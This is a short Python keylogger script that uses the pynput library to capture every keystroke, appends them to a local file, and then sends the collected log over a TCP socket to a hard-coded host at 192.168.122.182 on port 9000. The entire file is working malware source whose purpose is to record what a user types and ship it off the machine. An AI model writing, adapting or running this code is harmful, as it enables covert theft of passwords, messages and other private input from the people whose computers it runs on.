import pynput.keyboard
import socket

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        else:
            log += f" {str(key)} "
    print(f"Key pressed: {key}")

def write_file(text):
    with open("keylogs.txt", "a") as f:
        f.write(text)

def send_logs():
    global log
    server_ip = "192.168.122.182"
    port = 9000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((server_ip, port))
        s.sendall(log.encode())
        print(f"Logs sent to {server_ip}:{port}")
    except Exception as e:
        print(f"Failed to send logs: {e}")
    finally:
        s.close()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass

write_file(log)
send_logs()